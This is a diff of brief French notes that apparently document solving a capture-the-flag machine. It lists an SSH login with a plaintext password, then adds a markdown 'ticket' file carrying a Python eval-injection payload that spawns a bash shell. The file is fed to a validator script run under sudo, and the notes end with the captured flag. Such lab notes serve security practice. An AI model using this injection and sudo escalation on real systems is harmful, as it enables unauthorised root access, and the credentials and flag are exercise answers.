@@ -119,3 +119,14 @@ connection ssh :
 ssh development@10.10.11.100 -p 22
 pass : m19RoAU0hP41A1sTsq6K
 
+creer fichier .md
+
+# Skytrain Inc
+## Ticket to abc
+__Ticket Code:__
+__Ticket Code:__
+**4+200+exec('import pty;pty.spawn("/bin/bash")')
+
+sudo python3.8 /opt/skytrain_inc/ticketValidator.py
+
+flag : 7138806aeade7fbcd1a9da00671b4183
